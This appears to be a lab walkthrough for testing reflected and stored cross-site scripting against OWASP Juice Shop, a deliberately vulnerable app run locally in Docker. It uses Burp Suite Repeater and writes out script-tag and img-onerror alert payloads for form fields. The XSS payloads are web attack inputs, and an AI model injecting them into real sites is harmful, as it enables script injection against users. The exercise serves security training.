docker run -d -p 3000:3000 bkimminich/juice-shop
Open browser → http://localhost:3000
Open Burp Suite → Proxy → Intercept → turn OFF
Firefox → Preferences → Network Settings → Manual proxy → HTTP Proxy: 127.0.0.1, Port: 8080
Browse Juice Shop, look for input fields (search bar, feedback form)
Proxy → HTTP History → find request with input field → right-click → Send to Repeater
In Repeater, modify input field value to <script>alert("XSS")</script> → Send
Navigate to Contact Us/Feedback page → enter in comment field:

html<script>alert("XSS")</script>

Submit form → press F12 → Console tab to verify execution
For Stored XSS, enter in any form that saves data:

html<script>document.write('<img src=x onerror=alert("Stored XSS")>');</script>

Submit → reload the page where input is displayed to confirm execution
